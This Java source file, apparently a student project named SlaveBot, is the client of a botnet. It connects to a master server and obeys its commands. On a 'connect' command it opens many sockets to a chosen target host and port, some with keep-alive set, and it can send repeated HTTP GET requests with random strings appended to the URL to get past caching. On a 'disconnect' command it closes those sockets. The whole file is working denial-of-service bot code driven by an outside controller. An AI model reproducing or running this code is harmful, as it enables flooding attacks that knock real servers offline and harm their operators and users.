import java.io.*;
import java.util.ArrayList;
import java.util.Random;
import java.util.StringTokenizer;
import java.net.*;

public class SlaveBot {

	/*
	public class HandleConnect implements Runnable {
		
		int Number_connection;
		String Thost;
		int Tport;
	 ArrayList<Socket> arr_clientsocket = new ArrayList<Socket>();
		
public void run(){
	for (int i=0; i<Integer.valueOf(Number_connection); i++)
	{
		Socket attack = new Socket();
		try {
			attack.setKeepAlive(true);
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			attack.connect(new InetSocketAddress(Thost, Integer.valueOf(Tport)));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		arr_clientsocket.add(attack);
		System.out.println("connect with keep alive option on ");
		try {
			System.out.println(attack.getKeepAlive());
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
		
}	
			
	}
	
*/
	
	// random string generator.......
	public static String getRandomString(int length) {
	       final String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+";
	       StringBuilder result = new StringBuilder();
	       while(length > 0) {
	           Random rand = new Random();
	           result.append(characters.charAt(rand.nextInt(characters.length())));
	           length--;
	           System.out.println(result);
	       }
	       return result.toString();
	    }
	
	
	public static void main(String[] args) throws Exception {

		Socket cs = new Socket(args[0], Integer.valueOf(args[1]));

		String str = cs.getRemoteSocketAddress().toString();

		OutputStreamWriter send = new OutputStreamWriter(cs.getOutputStream());
		PrintWriter writeto = new PrintWriter(send);

		send.write(str);

		//System.out.println("Message Sent to IP-port:" + str);
		ArrayList<Socket> arr_clientsocket = new ArrayList<Socket>();
		/*
		 * String INET_ADDR = "127.0.0.1"; int PORT = Integer.valueOf(args[1]);
		 * InetAddress address = InetAddress.getByName(INET_ADDR); byte[] buf =
		 * new byte[256];
		 */
		// Socket attack = null;
		while (true) {
			InputStream read_in = cs.getInputStream();
			InputStreamReader read = new InputStreamReader(read_in);
			BufferedReader buff_read = new BufferedReader(read);

			//System.out.println("Listening for connect from server.....");
			String command_in = buff_read.readLine();
			send.flush();

		System.out.println("message from server " + command_in);

			String avinash = command_in;
			String[] parts = avinash.split(" ");
			//String Talive = parts[5];
		// 	String Talive = "";
			
			int Number_connection;

			if (parts.length < 5) {

				Number_connection = 1;

			}
			//
			else {
				Number_connection = Integer.valueOf(parts[4]);
			}
			
			

			String Thost = parts[2];
			String Tport = "";
			String Talive = "";
		
			// String Tport = st.nextToken();
			// int Integer.valueOf(i);
			// attack = new Socket();


			// if the command contains disconnect and the second function all is mising then go inside. 
			if (command_in.contains("disconnect")&&(!parts[1].toLowerCase().equals("all"))) {
				// StringTokenizer st = new StringTokenizer(command_in,":");
				Tport = parts[3];
				for (int i = 0; i < arr_clientsocket.size(); i++) {
					Socket var = arr_clientsocket.get(i);
					if(var!=null){
						String hostname = var.getInetAddress().getHostName();
						int PORTNUMBER= var.getPort();
						System.out.println("HOSTNAME:"+hostname);
						System.out.println("PORTNUMBER:"+PORTNUMBER);
						
						// if the Thost has got the host name and the port is also sent in the command then enter this condition.
						
						if(Thost.toLowerCase().equals(hostname.toLowerCase())&&(Tport.equals(String.valueOf(PORTNUMBER))))
						{
      
							var.close();
							var = null;
							arr_clientsocket.set(i, var);

							// String attack_to = "WWW.google.com";
							// attack.disconnect(new
							// InetSocketAddress(st.nextToken(),Integer.valueOf(st.nextToken())));

							//System.out.println("disconnected from "+ Thost + "at port "+Tport);
						}
					}
				}
				
				
			}
			
			
			// Now if the command sent by the master contains disconnect and the second charecter after space is all then enter this condition. 
			else if(command_in.contains("disconnect")&&(parts[1].toLowerCase().equals("all"))){
				if (parts.length>3){
					Tport = parts[3];
				}
				for (int i = 0; i < arr_clientsocket.size(); i++) {
					Socket var = arr_clientsocket.get(i);
					if(var!=null){
						String hostname = var.getInetAddress().getHostName();
						int PORTNUMBER= var.getPort();
						//System.out.println("HOSTNAME:"+hostname);
						//System.out.println("PORTNUMBER:"+PORTNUMBER);
						
	// now if the port number is not given but host is given   or another condition as both host nad the port number is present then enter this condition 					
						if((Tport.isEmpty()&& Thost.toLowerCase().equals(hostname.toLowerCase()))|| Thost.toLowerCase().equals(hostname.toLowerCase())&&(Tport.equals(String.valueOf(PORTNUMBER))) )
						{

							var.close();
							var = null;
							arr_clientsocket.set(i, var);

							// String attack_to = "WWW.google.com";
							// attack.disconnect(new
							// InetSocketAddress(st.nextToken(),Integer.valueOf(st.nextToken())));

							//System.out.println("disconnected from "+ Thost + "at port "+Tport);
						}
					}
				}
				
			}
			
			
			
			else if (command_in.contains("connect")) {
				// StringTokenizer st = new StringTokenizer("command_in");
				// String avinash = command_in;
				// String[] parts = avinash.split(" ");

				// String Thost = parts[2];
				// String Tport = parts[3];
				// String Number_connection = parts[4];
				// System.out.println(Tport);
				// String Tport = st.nextToken();
				// int Integer.valueOf(i);
				// attack = new Socket();
				Tport = parts[3];
				
				if (parts.length>5)
				{
					Talive = parts[5];
					System.out.println(Talive);
				}
				
			// enters this condition if talive == KEEP ALIVE 
				if (Talive.equals("KeepAlive"))
				{
					
					for (int i=0; i<Integer.valueOf(Number_connection); i++)
					{
						Socket attack = new Socket();
						attack.setKeepAlive(true);
						attack.connect(new InetSocketAddress(Thost, Integer.valueOf(Tport)));
						arr_clientsocket.add(attack);
						//System.out.println("connect with keep alive option on ");
						System.out.println(attack.getKeepAlive());
						System.out.println("connected to "+ Thost + "at port "+Tport);
					}
					
					
	
				}
				
				
				
				else if(Talive.contains("http"))
				{
					String URL_string= Talive;
					
					for (int i=0; i<Integer.valueOf(Number_connection); i++)
					{
						Socket attack = new Socket();
						attack.connect(new InetSocketAddress(Thost, Integer.valueOf(Tport)));
						arr_clientsocket.add(attack);
						System.out.println("connected to "+ Thost + " at port "+Tport);
						
						SlaveBot rand = new SlaveBot();
						Random ra=new Random();
						int randomNum =ra.nextInt((10 - 9) + 1) + 1;
						//SOP
				String RandVar=	rand.getRandomString(randomNum);
					
						String NewURL_string = URL_string+RandVar;
						System.out.println(NewURL_string);
						
						URL path = new URL(NewURL_string);
						HttpURLConnection request = (HttpURLConnection)path.openConnection();
						request.setRequestMethod("GET");
						
						// getting the response from the target and deleting it
						 int Target_response = request.getResponseCode();  
						 System.out.println("Target Response : "+ Target_response);  
					 // read the response from the target server
						 
						 BufferedReader in = new BufferedReader(  
					  new InputStreamReader(request.getInputStream()));  
						  String output;  
						  StringBuffer response = new StringBuffer();  
						  
						  while ((output = in.readLine()) != null) {  
						   response.append(output);  
						  }  
						  
						  in.close();  
						  
						  //printing result from response  
						  System.out.println(response.toString());  
						  
						 
						 
						  
						
					}
					
					
					
					
				}
				
				
				
				
				
				
				
				
				else	for (int i = 0; i < Integer.valueOf(Number_connection); i++) {
					Socket attack = new Socket();
					//attack.setKeepAlive(true);
					
					

					attack.connect(new InetSocketAddress(Thost, Integer.valueOf(Tport)));
					arr_clientsocket.add(attack);
					
					
					
					
				//	System.out.println("THOST"+ Thost);
					System.out.println("connected to " + Thost + " on port " + Tport);
					// }
				}
			}
		}
	}

}
